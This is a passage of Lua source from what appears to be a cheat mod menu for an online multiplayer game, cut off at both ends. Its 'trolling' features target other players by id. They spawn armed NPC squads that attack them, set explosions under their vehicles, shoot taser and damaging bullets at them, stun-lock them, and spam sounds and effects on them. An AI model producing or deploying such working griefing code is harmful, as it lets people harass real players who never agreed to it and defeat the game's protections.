    audio.play_sound_from_coord(-1, "1st_Person_Transition", entity.get_entity_coords(player.get_player_ped(pid)), "PLAYER_SWITCH_CUSTOM_SOUNDSET", true, 5, false)
end)

menu.add_player_feature("Cicadas", "action", trolling.id, function(playerfeat, pid)
    menu.notify("Do not overuse the Cicadas sound or Sound Trolling will stop working for a little while", "WARNING", 10, 0x000000ff)
    for i=1,10 do
        audio.play_sound_from_coord(-1,"SHUTTER_FLASH", entity.get_entity_coords(player.get_player_ped(pid)), "CAMERA_FLASH_SOUNDSET", true, 5, false)
        system.wait(0)
    end
end)

menu.add_player_feature("Fast Beep Loop", "toggle", trolling.id, function(eToggle, pid)
    while eToggle.on do
        audio.play_sound_from_coord(-1, "Beep_Red", entity.get_entity_coords(player.get_player_ped(pid)), "DLC_HEIST_HACKING_SNAKE_SOUNDS", true, 5, false)
        system.wait(0)
    end
end)

menu.add_player_feature("Bari Sax Loop", "toggle", trolling.id, function(eToggle, pid)
    while eToggle.on do
        audio.play_sound_from_coord(-1,"Horn", entity.get_entity_coords(player.get_player_ped(pid)), "DLC_Apt_Yacht_Ambient_Soundset", true, 5, false)
        system.wait(0)
    end
end)

menu.add_player_feature("send cops", "action", trolling.id, function(feat, pid)
    if feat.on then
        local players_ply_ped = player.get_player_ped(pid) local pos = player.get_player_coords(pid) local attacker_ped = 1581098148 streaming.request_model(attacker_ped) if not streaming.has_model_loaded(attacker_ped) then menu.notify("model not loaded please try again", "Galactic Lua lua", 9, 80) else local attacking_ped = ped.create_ped(6, attacker_ped, pos, pos.z, true, false) local attacking_ped1 = ped.create_ped(6, attacker_ped, pos, pos.z, true, false) streaming.set_model_as_no_longer_needed(attacker_ped) ped.set_ped_combat_attributes(attacking_ped, 46, true) ai.task_combat_ped(attacking_ped, players_ply_ped, 0, 16) ped.set_ped_combat_attributes(attacking_ped1, 46, true) ai.task_combat_ped(attacking_ped1, players_ply_ped, 0, 16) end end	
    end)
    menu.add_player_feature("send big foot", "action", trolling.id, function(feat, pid)
    if feat.on then
        local players_ply_ped = player.get_player_ped(pid) local pos = player.get_player_coords(pid) local attacker_ped = 1641334641 streaming.request_model(attacker_ped) if not streaming.has_model_loaded(attacker_ped) then menu.notify("model not loaded please try again", "Galactic Lua lua", 9, 80) else local attacking_ped = ped.create_ped(28, attacker_ped, pos, pos.z, true, false) local attacking_ped1 = ped.create_ped(28, attacker_ped, pos, pos.z, true, false) streaming.set_model_as_no_longer_needed(attacker_ped) ped.set_ped_combat_attributes(attacking_ped, 46, true) ai.task_combat_ped(attacking_ped, players_ply_ped, 0, 16) ped.set_ped_combat_attributes(attacking_ped1, 46, true) ai.task_combat_ped(attacking_ped1, players_ply_ped, 0, 16) end end	
    end)
        menu.add_player_feature("send pogo", "action", trolling.id, function(feat, pid)
            if feat.on then
                local players_ply_ped = player.get_player_ped(pid) local pos = player.get_player_coords(pid) local attacker_ped = 0xDC59940D streaming.request_model(attacker_ped) if not streaming.has_model_loaded(attacker_ped) then menu.notify("model not loaded please try again", "Galactic Lua lua", 9, 80) else local attacking_ped = ped.create_ped(5, attacker_ped, pos, pos.z, true, false) local attacking_ped1 = ped.create_ped(4, attacker_ped, pos, pos.z, true, false) streaming.set_model_as_no_longer_needed(attacker_ped) ped.set_ped_combat_attributes(attacking_ped, 46, true) ai.task_combat_ped(attacking_ped, players_ply_ped, 0, 16) ped.set_ped_combat_attributes(attacking_ped1, 46, true) ai.task_combat_ped(attacking_ped1, players_ply_ped, 0, 16) end end	
            end)
            menu.add_player_feature("send Prisoner's", "action", trolling.id, function(feat, pid)
                if feat.on then
                    local players_ply_ped = player.get_player_ped(pid) local pos = player.get_player_coords(pid) local attacker_ped = 2981862233 streaming.request_model(attacker_ped) if not streaming.has_model_loaded(attacker_ped) then menu.notify("model not loaded please try again", "Galactic Lua lua", 9, 80) else local attacking_ped = ped.create_ped(4, attacker_ped, pos, pos.z, true, false) local attacking_ped1 = ped.create_ped(5, attacker_ped, pos, pos.z, true, false) streaming.set_model_as_no_longer_needed(attacker_ped) ped.set_ped_combat_attributes(attacking_ped, 46, true) ai.task_combat_ped(attacking_ped, players_ply_ped, 0, 16) ped.set_ped_combat_attributes(attacking_ped1, 46, true) ai.task_combat_ped(attacking_ped1, players_ply_ped, 0, 16) end end	
                end)
                menu.add_player_feature("send stripper", "action", trolling.id, function(feat, pid)
                    if feat.on then
                        local players_ply_ped = player.get_player_ped(pid) local pos = player.get_player_coords(pid) local attacker_ped = 1846523796 streaming.request_model(attacker_ped) if not streaming.has_model_loaded(attacker_ped) then menu.notify("model not loaded please try again", "Galactic Lua lua", 9, 80) else local attacking_ped = ped.create_ped(4, attacker_ped, pos, pos.z, true, false) local attacking_ped1 = ped.create_ped(5, attacker_ped, pos, pos.z, true, false) streaming.set_model_as_no_longer_needed(attacker_ped) ped.set_ped_combat_attributes(attacking_ped, 46, true) ai.task_combat_ped(attacking_ped, players_ply_ped, 0, 16) ped.set_ped_combat_attributes(attacking_ped1, 46, true) ai.task_combat_ped(attacking_ped1, players_ply_ped, 0, 16) end end	
                    end)
                    menu.add_player_feature("send naked men", "action", trolling.id, function(feat, pid)
                        if feat.on then
                            local players_ply_ped = player.get_player_ped(pid) local pos = player.get_player_coords(pid) local attacker_ped = 1413662315 streaming.request_model(attacker_ped) if not streaming.has_model_loaded(attacker_ped) then menu.notify("model not loaded please try again", "Galactic Lua lua", 9, 80) else local attacking_ped = ped.create_ped(4, attacker_ped, pos, pos.z, true, false) local attacking_ped1 = ped.create_ped(5, attacker_ped, pos, pos.z, true, false) streaming.set_model_as_no_longer_needed(attacker_ped) ped.set_ped_combat_attributes(attacking_ped, 46, true) ai.task_combat_ped(attacking_ped, players_ply_ped, 0, 16) ped.set_ped_combat_attributes(attacking_ped1, 46, true) ai.task_combat_ped(attacking_ped1, players_ply_ped, 0, 16) end end	
                        end)
                        menu.add_player_feature("send clown's", "action", trolling.id, function(feat, pid)
                            if feat.on then
                                local players_ply_ped = player.get_player_ped(pid) local pos = player.get_player_coords(pid) local attacker_ped = 71929310 streaming.request_model(attacker_ped) if not streaming.has_model_loaded(attacker_ped) then menu.notify("model not loaded please try again", "Galactic Lua lua", 9, 80) else local attacking_ped = ped.create_ped(4, attacker_ped, pos, pos.z, true, false) local attacking_ped1 = ped.create_ped(5, attacker_ped, pos, pos.z, true, false) streaming.set_model_as_no_longer_needed(attacker_ped) ped.set_ped_combat_attributes(attacking_ped, 46, true) ai.task_combat_ped(attacking_ped, players_ply_ped, 0, 16) ped.set_ped_combat_attributes(attacking_ped1, 46, true) ai.task_combat_ped(attacking_ped1, players_ply_ped, 0, 16) end end	
                            end)

                            menu.add_player_feature("Spawn Angry Clowns", "action", trolling.id, function(playerfeat, pid)
                                local hash = gameplay.get_hash_key("s_m_y_clown_01")
                               
                                streaming.request_model(hash)
                                while (not streaming.has_model_loaded(hash)) do
                                  system.wait(0)
                               end
                              
                               for i =1, 10 do
                                local Peds = ped.create_ped(29, hash, player.get_player_coords(pid), 1.0, true, false)
                                weapon.give_delayed_weapon_to_ped(Peds, 0x78A97CD0, 0, true)
                                ped.set_ped_combat_ability(Peds, 2)
                                ped.set_ped_combat_attributes(Peds, 5, true)
                                ai.task_combat_ped(Peds, player.get_player_ped(pid), 1, 16)
                                end
                             end)

                             menu.add_player_feature("Spawn Angry Swat Team", "action", trolling.id, function(playerfeat, pid)
                                local hash = gameplay.get_hash_key("s_m_y_swat_01")
                               
                                streaming.request_model(hash)
                                while (not streaming.has_model_loaded(hash)) do
                                  system.wait(0)
                               end
                              
                               for i =1, 10 do
                                local Peds = ped.create_ped(29, hash, player.get_player_coords(pid), 1.0, true, false)
                                weapon.give_delayed_weapon_to_ped(Peds, 0x78A97CD0, 0, true)
                                ped.set_ped_combat_ability(Peds, 2)
                                ped.set_ped_combat_attributes(Peds, 5, true)
                                ai.task_combat_ped(Peds, player.get_player_ped(pid), 1, 16)
                                end
                             end)

                             menu.add_player_feature("Spawn Angry Marine Team", "action", trolling.id, function(playerfeat, pid)
                                local hash = gameplay.get_hash_key("s_m_y_marine_03")
                               
                                streaming.request_model(hash)
                                while (not streaming.has_model_loaded(hash)) do
                                  system.wait(0)
                               end
                              
                               for i =1, 10 do
                                local Peds = ped.create_ped(29, hash, player.get_player_coords(pid), 1.0, true, false)
                                weapon.give_delayed_weapon_to_ped(Peds, 0x78A97CD0, 0, true)
                                ped.set_ped_combat_ability(Peds, 2)
                                ped.set_ped_combat_attributes(Peds, 5, true)
                                ai.task_combat_ped(Peds, player.get_player_ped(pid), 1, 16)
                                end
                             end)

                             menu.add_player_feature("Spawn Seagull Team", "action", trolling.id, function(playerfeat, pid)
                                local hash = gameplay.get_hash_key("a_c_seagull")
                               
                                streaming.request_model(hash)
                                while (not streaming.has_model_loaded(hash)) do
                                  system.wait(0)
                               end
                              
                               for i =1, 10 do
                                local Peds = ped.create_ped(29, hash, player.get_player_coords(pid), 1.0, true, false)
                                weapon.give_delayed_weapon_to_ped(Peds, 0x78A97CD0, 0, true)
                                ped.set_ped_combat_ability(Peds, 2)
                                ped.set_ped_combat_attributes(Peds, 5, true)
                                ai.task_combat_ped(Peds, player.get_player_ped(pid), 1, 16)
                                end
                             end)

-- Make Player Fart
--start_networked_ptfx_non_looped_at_coord(string name, v3 pos, v3 rot, float scale, bool xAxis, bool yAxis, bool zAxis)
--exp_grd_bzgas_smoke
menu.add_player_feature("Cause Player To Fart", "action", trolling.id, function(playerfeat, pid)
    menu.notify("Caused " .. player.get_player_name(pid) .. " to pass gas", "", 10, 2)
    local player_heading = player.get_player_heading(pid)

    graphics.set_next_ptfx_asset("scr_xm_riotvan")
    while not graphics.has_named_ptfx_asset_loaded("scr_xm_riotvan") do
        graphics.request_named_ptfx_asset("scr_xm_riotvan")
        system.wait(0)
    end

    --audio.play_sound_from_coord(-1,"Engine_Rev", entity.get_entity_coords(player.get_player_ped(pid)), "Lowrider_Super_Mod_Garage_Sounds", true, 5, false)
    graphics.start_networked_ptfx_non_looped_at_coord("scr_xm_riotvan_extinguish", player.get_player_coords(pid), v3(0, 0, player_heading), 1, false, false, true)
end)

-- Cause a player's vehicle to slip uncontrollably
menu.add_player_feature("Slippery Driving", "action", trolling.id, function(playerfeat, pid)
    if player.is_player_in_any_vehicle(pid) == true then
        menu.notify("Caused " .. player.get_player_name(pid) .. "'s vehicle to slip uncontrollably", "", 10, 2)
        local pos = player.get_player_coords(pid)
        fire.add_explosion(pos, 67, true, false, 0, pid)
    else
        menu.notify(player.get_player_name(pid) .. " is not in a vehicle", "", 10, 2)
    end
end)

-- Cause a player to cosmetically bleed out
menu.add_player_feature("Cosmetic Bleed Out", "toggle", trolling.id, function(playerfeat_toggle, pid)
    menu.notify("Prolonged usage of this PTFX will cause the PTFX to no longer work until you change sessions.", "WARNING", 10, 0x000000ff)
    while playerfeat_toggle.on do
        graphics.set_next_ptfx_asset("core")
        while not graphics.has_named_ptfx_asset_loaded("core") do
            graphics.request_named_ptfx_asset("core")
            system.wait(0)
        end
        graphics.start_networked_ptfx_looped_on_entity("blood_stab", player.get_player_ped(pid), v3(0, 0.07, 0.3), v3(-50, 0, 0), 2)
        system.wait(1000)
    end
end)

-- Actually cause a player to bleed out
menu.add_player_feature("True Bleed Out", "toggle", trolling.id, function(playerfeat_toggle, pid)
    menu.notify("Prolonged usage of this PTFX will cause the PTFX to no longer work until you change sessions.", "WARNING", 10, 0x000000ff)
    local pos = player.get_player_coords(pid)
    pos.x = pos.x + 0.7
    pos.z = pos.z + 1
    while playerfeat_toggle.on do
        graphics.set_next_ptfx_asset("core")
        while not graphics.has_named_ptfx_asset_loaded("core") do
            graphics.request_named_ptfx_asset("core")
            system.wait(0)
        end
        gameplay.shoot_single_bullet_between_coords(pos, player.get_player_coords(pid), 50, 0x1B06D571, 0, true, false, 1)
        graphics.start_networked_ptfx_looped_on_entity("blood_stab", player.get_player_ped(pid), v3(0, 0.07, 0.3), v3(-50, 0, 0), 2)
        system.wait(1000)
    end
end)

-- Taze a player once
menu.add_player_feature("Taze", "action", trolling.id, function(playerfeat, pid)
    --shoot_single_bullet_between_coords(v3 start, v3 end, int32_t damage, Hash weapon, Ped owner, bool audible, bool invisible, float speed)
    local pos = player.get_player_coords(pid)
    pos.x = pos.x + 0.2
    pos.z = pos.z + 0.7
    gameplay.shoot_single_bullet_between_coords(pos, player.get_player_coords(pid), 1, 0x3656C8C1, pid, true, false, 1)
end)

-- Repeatedly taze a player
menu.add_player_feature("Stun Lock", "toggle", trolling.id, function(playerfeat_toggle, pid)
    local pos = player.get_player_coords(pid)
    pos.z = pos.z + 0.7
    while playerfeat_toggle.on do
        gameplay.shoot_single_bullet_between_coords(pos, player.get_player_coords(pid), 1, 0x3656C8C1, pid, true, false, 1)
        system.wait(4000)
    end
end)

-- Cause player to shit themselves
menu.add_player_feature("Cause Player To Shit", "action", trolling.id, function(playerfeat, pid)
    menu.notify("Caused " .. player.get_player_name(pid) .. " to shit themselves", "", 10, 2)
    local player_heading = player.get_player_heading(pid)

    graphics.set_next_ptfx_asset("core_snow")
    while not graphics.has_named_ptfx_asset_loaded("core_snow") do
        graphics.request_named_ptfx_asset("core_snow")
        system.wait(0)
    end

    --audio.play_sound_from_coord(-1,"Engine_Rev", entity.get_entity_coords(player.get_player_ped(pid)), "Lowrider_Super_Mod_Garage_Sounds", true, 5, false)
    graphics.start_networked_ptfx_non_looped_at_coord("cs_mich1_spade_dirt_throw", player.get_player_coords(pid), v3(0, 0, player_heading), 1, false, false, true)
end)

-- Ragdoll player
menu.add_player_feature("Ragdoll Player", "action", trolling.id, function(playerfeat, pid)
    local pos = player.get_player_coords(pid)
    pos.z = pos.z + 0.7
    gameplay.shoot_single_bullet_between_coords(pos, player.get_player_coords(pid), 0, 0xAF3696A1, pid, true, false, 1)
end)

menu.add_player_feature("Spawn A Hostile NPC", "toggle", trolling.id, function(playerfeat_toggle, pid)
    local MP_Male_ped = 0x705E61F2
    local firing_pattern = gameplay.get_hash_key("FIRING_PATTERN_SINGLE_SHOT")


    --set_ped_head_blend_data(Ped ped, int shape_first, int shape_second, int shape_third, int skin_first, int skin_second, int skin_third, float mix_shape, float mix_skin, float mix_third)
    --set_ped_component_variation(Ped ped, int component, int drawable, int texture, int pallette)
    --get_ped_drawable_variation(Ped ped, int group)
    streaming.request_model(MP_Male_ped)
    while (not streaming.has_model_loaded(MP_Male_ped)) do
        system.wait(10)
    end

    --Ped looks setup
    local _ped = ped.create_ped(1, MP_Male_ped, player.get_player_coords(pid) + v3(0, 2, 0), 0, true, false)
    ped.set_ped_component_variation(_ped, 2, select(math.random(1,5), 7, 18, 19, 31, 40), 0, 0) --hair
    ped.set_ped_component_variation(_ped, 4, 24, 2, 0) --legs
    ped.set_ped_component_variation(_ped, 11, 23, 0, 0) --tops
    ped.set_ped_component_variation(_ped, 6, select(math.random(1, 3), 10, 20, 21), 0, 0) --feet
    ped.set_ped_component_variation(_ped, 3, 4, 0, 0) --torsos
    ped.set_ped_component_variation(_ped, 8, 10, 0, 0) --underhsirts
    ped.set_ped_component_variation(_ped, 7, select(math.random(1, 2), 0, 21), select(math.random(1, 3), 9, 10, 11), 0) --accessories
    ped.set_ped_head_blend_data(_ped, math.random(0, 13), math.random(0, 13), math.random(0, 13), math.random(0, 13), math.random(0, 13), math.random(0, 13), math.random(), math.random(), math.random())

    --Ped setup
    --give_delayed_weapon_to_ped(Ped ped, Hash hash, int time, bool equipNow)
    weapon.give_delayed_weapon_to_ped(_ped, 0x3656C8C1, 0, true)
    --ped.set_ped_max_health(_ped, 328.0)
    --ped.set_ped_accuracy(_ped, 100)
    ped.set_ped_combat_ability(_ped, 2)
    ped.set_ped_combat_attributes(_ped, 5, true)

    --Ped AI
    -- ai.task_go_to_coord_by_any_means(_ped, player.get_player_coords(pid), 2, 0, true, 1, 0.0)
    for i = 1, 10 do
        ai.task_combat_ped(_ped, player.get_player_ped(pid), 1, 16)
        --ai.task_shoot_at_entity(_ped, player_ped, 100, firing_pattern)
        --ai.task_shoot_gun_at_coord(_ped, player.get_player_coords(pid), 100, firing_pattern)
    end
end)

menu.add_player_feature("Turn Nearby NPCs Into...", "action_value_str", trolling.id, function(playerfeat_val, pid)
    local peds = ped.get_all_peds()
    for i=1, #peds do
        if not ped.is_ped_a_player(peds[i]) then
            ped.clear_ped_tasks_immediately(peds[i])
            if (playerfeat_val.value == 0) then
                ai.task_start_scenario_in_place(peds[i], "WORLD_HUMAN_MUSICIAN", 0, true)
            elseif (playerfeat_val.value == 1) then
                ai.task_start_scenario_in_place(peds[i], "WORLD_HUMAN_PROSTITUTE_LOW_CLASS", 0, true)
            elseif (playerfeat_val.value == 2) then
                ai.task_start_scenario_in_place(peds[i], "WORLD_HUMAN_HUMAN_STATUE", 0, true)
            elseif (playerfeat_val.value == 3) then
                ai.task_start_scenario_in_place(peds[i], "WORLD_HUMAN_PAPARAZZI", 0, true)
            elseif (playerfeat_val.value == 4) then
                ai.task_start_scenario_in_place(peds[i], "WORLD_HUMAN_JANITOR", 0, true)
            end
        end
    end
end):set_str_data({"Musicians", "Prostitutes", "Statues", "Paparazzos", "Janitors"})

-- Turn Nearby NPCs into... <custom input>
menu.add_player_feature("Make NPCs Perform A Custom Scenario", "action", trolling.id, function(playerfeat, pid)
    local _input, k = input.get("Type in a custom NPC world scenario", "world_human_musician", 100, 0)
    if _input == 1 then
        return HANDLER_CONTINUE
    end
    if _input == 2 then
        return HANDLER_POP
    end

    local peds = ped.get_all_peds()
    for i=1, #peds do
        if not ped.is_ped_a_player(peds[i]) then
            ped.clear_ped_tasks_immediately(peds[i])
            ai.task_start_scenario_in_place(peds[i], k:upper(), 0, true)
        end
    end
end)

-- Make nearby NPCs flop around
menu.add_player_feature("Make Nearby NPCs Flop Around", "toggle", trolling.id, function(playerfeat_toggle, pid)
    local peds = ped.get_all_peds()
    while playerfeat_toggle.on do
        for i=1, #peds do
            if not ped.is_ped_a_player(peds[i]) then
                ped.clear_ped_tasks_immediately(peds[i])
                ai.task_sky_dive(peds[i], true)
            end
        end
        system.wait(1500)
    end
end)

-- Spawn a pole dancing terrorist
menu.add_player_feature("Spawn Stripper Terrorist", "action_value_str", trolling.id, function(playerfeat_val, pid)
    menu.notify("Spawned a pole dancing terrorist near "..player.get_player_name(pid)..". This only works if you're in range or spectating the player.", "", 10, 0x00ff00)
    local MP_Male_ped = 0x705E61F2
    streaming.request_anim_dict("mini@strip_club@pole_dance@pole_dance1")
    streaming.request_anim_set("pd_dance_01")

    streaming.request_model(MP_Male_ped)
    while (not streaming.has_model_loaded(MP_Male_ped)) do
        system.wait(10)
    end

    local _ped = ped.create_ped(1, MP_Male_ped, player.get_player_coords(pid) + v3(math.random(-5, 5), math.random(-5, 5), 0), player.get_player_heading(pid), true, false)
    if (playerfeat_val.value == 0) then
        ped.set_ped_component_variation(_ped, 6, 6, 0, 0)
        menu.notify("Spawned a pole dancing terrorist wearing open slippers.", "", 10, 2)
    elseif (playerfeat_val.value == 1) then
        menu.notify("Spawned a pole dancing terrorist wearing flipflops.", "", 10, 2)
        ped.set_ped_component_variation(_ped, 6, 16, 0, 0)
    elseif (playerfeat_val.value == 2) then
        menu.notify("Spawned a barefoot pole dancing terrorist.", "", 10, 2)
        ped.set_ped_component_variation(_ped, 6, 34, 0, 0)
    end
    ped.set_ped_component_variation(_ped, 1, 115, 8, 0)
    ped.set_ped_component_variation(_ped, 11, 114, 0, 0)
    ped.set_ped_component_variation(_ped, 4, 56, 0, 0)
    ped.set_ped_component_variation(_ped, 9, 10, 1, 0)
    ped.set_ped_component_variation(_ped, 2, 38, 0, 0)
    ped.set_ped_component_variation(_ped, 8, 14, 0, 0)
    ped.set_ped_component_variation(_ped, 3, 4, 0, 0)
    ped.set_ped_head_blend_data(_ped, 5, 6, 0, 9, 0, 0, 0.25, 0, 0)

    local blippy = ui.add_blip_for_entity(_ped)
    ui.set_blip_sprite(blippy, 1)

    system.wait(450)
    network.request_control_of_entity(MP_Male_ped)
    if streaming.has_anim_dict_loaded("mini@strip_club@pole_dance@pole_dance1") then
        ai.task_play_anim(_ped, "mini@strip_club@pole_dance@pole_dance1", "pd_dance_01", 8.0, 0, -1, 9, 0, false, false, false)
        system.wait(20000)
        entity.set_entity_as_no_longer_needed(_ped)
        entity.delete_entity(_ped)
    else
        menu.notify("Anim not loaded", "", 10, 2)
    end
end):set_str_data({"Sandals", "Flip Flops", "Barefoot"})

-- Spawn a dead terrorist
menu.add_player_feature("Spawn Dead Terrorist", "value_str", trolling.id, function(playerfeat_toggle_val, pid)
    menu.notify("Spawned a dead terrorist near "..player.get_player_name(pid)..". This only works if you're in range or spectating the player.", "", 10, 0x00ff00)
    local MP_Male_ped = 0x705E61F2
    streaming.request_model(MP_Male_ped)
    while (not streaming.has_model_loaded(MP_Male_ped)) do
        system.wait(10)
    end

    local _ped = ped.create_ped(1, MP_Male_ped, player.get_player_coords(pid) + v3(math.random(-3, 3), math.random(-3, 3), 0), player.get_player_heading(pid), true, false)
    ped.set_ped_component_variation(_ped, 6, 34, 0, 0)
    ped.set_ped_component_variation(_ped, 1, 115, 8, 0)
    ped.set_ped_component_variation(_ped, 11, 114, 0, 0)
    ped.set_ped_component_variation(_ped, 4, 56, 0, 0)
    ped.set_ped_component_variation(_ped, 9, 10, 1, 0)
    ped.set_ped_component_variation(_ped, 2, 38, 0, 0)
    ped.set_ped_component_variation(_ped, 8, 14, 0, 0)
    ped.set_ped_component_variation(_ped, 3, 4, 0, 0)
    ped.set_ped_head_blend_data(_ped, 5, 6, 0, 9, 0, 0, 0.25, 0, 0)

    local blippy = ui.add_blip_for_entity(_ped)
    ui.set_blip_sprite(blippy, 1)

    system.wait(450)
    network.request_control_of_entity(MP_Male_ped)
    while (playerfeat_toggle_val.on) do
        if streaming.has_anim_dict_loaded("dead") then
            if (playerfeat_toggle_val.value == 0) then
                ai.task_play_anim(_ped, "dead", "dead_a", 8.0, 0, -1, 9, 0, false, false, false)
            elseif (playerfeat_toggle_val.value == 1) then
                ai.task_play_anim(_ped, "dead", "dead_b", 8.0, 0, -1, 9, 0, false, false, false)
            elseif (playerfeat_toggle_val.value == 2) then
                ai.task_play_anim(_ped, "dead", "dead_c", 8.0, 0, -1, 9, 0, false, false, false)
            elseif (playerfeat_toggle_val.value == 3) then
                ai.task_play_anim(_ped, "dead", "dead_d", 8.0, 0, -1, 9, 0, false, false, false)
            elseif (playerfeat_toggle_val.value == 4) then
                ai.task_play_anim(_ped, "dead", "dead_e", 8.0, 0, -1, 9, 0, false, false, false)
            elseif (playerfeat_toggle_val.value == 5) then
                ai.task_play_anim(_ped, "dead", "dead_f", 8.0, 0, -1, 9, 0, false, false, false)
            elseif (playerfeat_toggle_val.value == 6) then
                ai.task_play_anim(_ped, "dead", "dead_g", 8.0, 0, -1, 9, 0, false, false, false)
            elseif (playerfeat_toggle_val.value == 7) then
                ai.task_play_anim(_ped, "dead", "dead_h", 8.0, 0, -1, 9, 0, false, false, false)
            end
        else
            menu.notify("Anim not loaded", "", 10, 2)
        end
        system.wait(1000)
    end
    if (not playerfeat_toggle_val.on) then
        entity.set_entity_as_no_longer_needed(_ped)
        entity.delete_entity(_ped)
    end
end):set_str_data({"Dead 1", "Dead 2", "Dead 3", "Dead 4", "Dead 5", "Dead 6", "Dead 7", "Dead 8"})

-- Spawn hostile NPCs
menu.add_player_feature("Stun Lock Player", "toggle", trolling.id, function(playerfeat_toggle, pid)
    menu.notify("Stun locking "..player.get_player_name(pid)..". This only works if you're in range or spectating the player.", "", 10, 0x00ff00)
    local MP_Male_ped = 0x705E61F2
    local firing_pattern = gameplay.get_hash_key("FIRING_PATTERN_BURST_FIRE_PISTOL")
    streaming.request_model(MP_Male_ped)
    while (not streaming.has_model_loaded(MP_Male_ped)) do
        system.wait(0)
    end

    --Ped looks setup
    local _ped = ped.create_ped(29, MP_Male_ped, player.get_player_coords(pid) + v3(math.random(-3, 3), math.random(-3, 3), 0), 1.0, true, false)
    ped.set_ped_component_variation(_ped, 2, select(math.random(1,5), 7, 18, 19, 31, 40), 0, 0) --hair
    ped.set_ped_component_variation(_ped, 4, 24, 2, 0) --legs
    ped.set_ped_component_variation(_ped, 11, 23, 0, 0) --tops
    ped.set_ped_component_variation(_ped, 6, select(math.random(1, 3), 10, 20, 21), 0, 0) --feet
    ped.set_ped_component_variation(_ped, 3, 4, 0, 0) --torsos
    ped.set_ped_component_variation(_ped, 8, 10, 0, 0) --underhsirts
    ped.set_ped_component_variation(_ped, 7, select(math.random(1, 2), 0, 21), select(math.random(1, 3), 9, 10, 11), 0) --accessories
    ped.set_ped_head_blend_data(_ped, math.random(0, 13), math.random(0, 13), math.random(0, 13), math.random(0, 13), math.random(0, 13), math.random(0, 13), math.random(), math.random(), math.random())

    --Ped setup
    weapon.give_delayed_weapon_to_ped(_ped, 0x3656C8C1, 0, true)
    ped.set_ped_max_health(_ped, 328.0)
    ped.set_ped_combat_ability(_ped, 100)
    ped.set_ped_combat_attributes(_ped, 5, true)

    --Ped AI
    while (playerfeat_toggle.on) do
        ai.task_shoot_gun_at_coord(_ped, player.get_player_coords(pid), 1100, firing_pattern)
        system.wait(1000)
    end
    if (not playerfeat_toggle.on) then
        entity.set_entity_as_no_longer_needed(_ped)
        entity.delete_entity(_ped)
    end
end)

--Spawn a copy of the player
menu.add_player_feature("Barefoot Follower", "value_str", trolling.id, function(playerfeat_toggle_val, pid)
    local MP_ped
    if (player.is_player_female(pid)) then
        MP_ped = 0x9C9EFFD8
    else
        MP_ped = 0x705E61F2
    end
    local plyr_clothes = {
        player_mask = ped.get_ped_drawable_variation(player.get_player_ped(pid), 1),
        player_top = ped.get_ped_drawable_variation(player.get_player_ped(pid), 11),
        player_legs = ped.get_ped_drawable_variation(player.get_player_ped(pid), 4),
        player_vest = ped.get_ped_drawable_variation(player.get_player_ped(pid), 9),
        player_hair = ped.get_ped_drawable_variation(player.get_player_ped(pid), 2),
        player_undershirts = ped.get_ped_drawable_variation(player.get_player_ped(pid), 8),
        player_torso = ped.get_ped_drawable_variation(player.get_player_ped(pid), 3),
        player_feet = ped.get_ped_drawable_variation(player.get_player_ped(pid), 6),
        player_accessories = ped.get_ped_drawable_variation(player.get_player_ped(pid), 7),
        player_hats = ped.get_ped_prop_index(player.get_player_ped(pid), 0),
        player_glasses = ped.get_ped_prop_index(player.get_player_ped(pid), 1),
        player_ears = ped.get_ped_prop_index(player.get_player_ped(pid), 2),
        player_watches = ped.get_ped_prop_index(player.get_player_ped(pid), 6),
        player_bracelets = ped.get_ped_prop_index(player.get_player_ped(pid), 7),
    }
    local plyr_cloth_tex = {
        player_mask_tex = ped.get_ped_texture_variation(player.get_player_ped(pid), 1),
        player_top_tex = ped.get_ped_texture_variation(player.get_player_ped(pid), 11),
        player_legs_tex = ped.get_ped_texture_variation(player.get_player_ped(pid), 4),
        player_vest_tex = ped.get_ped_texture_variation(player.get_player_ped(pid), 9),
        player_hair_tex = ped.get_ped_texture_variation(player.get_player_ped(pid), 2),
        player_undershirts_tex = ped.get_ped_texture_variation(player.get_player_ped(pid), 8),
        player_torso_tex = ped.get_ped_texture_variation(player.get_player_ped(pid), 3),
        player_accessories_tex = ped.get_ped_texture_variation(player.get_player_ped(pid), 7),
        player_hats_tex = ped.get_ped_prop_texture_index(player.get_player_ped(pid), 0),
        player_glasses_tex = ped.get_ped_prop_texture_index(player.get_player_ped(pid), 1),
        player_ears_tex = ped.get_ped_prop_texture_index(player.get_player_ped(pid), 2),
        player_watches_tex = ped.get_ped_prop_texture_index(player.get_player_ped(pid), 6),
        player_bracelets_tex = ped.get_ped_prop_texture_index(player.get_player_ped(pid), 7)
    }
    local _hb = ped.get_ped_head_blend_data(player.get_player_ped(pid))
    local pos = player.get_player_coords(pid)
    pos.x = pos.x + 25

    streaming.request_model(MP_ped)
    while (not streaming.has_model_loaded(MP_ped)) do
        system.wait(10)
    end

    local _ped
    if (playerfeat_toggle_val.value == 0) then
        menu.notify("Spawned a barefoot follower of "..player.get_player_name(pid)..". This only works if you're in range or spectating the player.", "", 10, 0x00ff00)
        _ped = ped.create_ped(1, MP_ped, player.get_player_coords(pid) + v3(math.random(-100, 100), math.random(-100, 100), 0), 0, true, false)
    elseif (playerfeat_toggle_val.value == 1) then
        menu.notify("Spawned a barefoot follower of "..player.get_player_name(pid)..". This only works if you're in the same interior as the target player.", "", 10, 0x00ff00)
        _ped = ped.create_ped(1, MP_ped, player.get_player_coords(pid) + v3(math.random(-5, 5), math.random(-5, 5), 0), 0, true, false)
    end

    ped.set_ped_component_variation(_ped, 1, plyr_clothes["player_mask"], plyr_cloth_tex["player_mask_tex"], 0)
    ped.set_ped_component_variation(_ped, 11, plyr_clothes["player_top"], plyr_cloth_tex["player_top_tex"], 0)
    ped.set_ped_component_variation(_ped, 4, plyr_clothes["player_legs"], plyr_cloth_tex["player_legs_tex"], 0)
    ped.set_ped_component_variation(_ped, 9, plyr_clothes["player_vest"], plyr_cloth_tex["player_vest_tex"], 0)
    ped.set_ped_component_variation(_ped, 2, plyr_clothes["player_hair"], plyr_cloth_tex["player_hair_tex"], 0)
    ped.set_ped_component_variation(_ped, 8, plyr_clothes["player_undershirts"], plyr_cloth_tex["player_undershirts_tex"], 0)
    ped.set_ped_component_variation(_ped, 3, plyr_clothes["player_torso"], plyr_cloth_tex["player_torso_tex"], 0)
    ped.set_ped_component_variation(_ped, 7, plyr_clothes["player_accessories"], plyr_cloth_tex["player_accessories_tex"], 0)
    ped.set_ped_prop_index(_ped, 0, plyr_clothes["player_hats"], plyr_cloth_tex["player_hats_tex"], 0)
    ped.set_ped_prop_index(_ped, 1, plyr_clothes["player_glasses"], plyr_cloth_tex["player_glasses_tex"], 0)
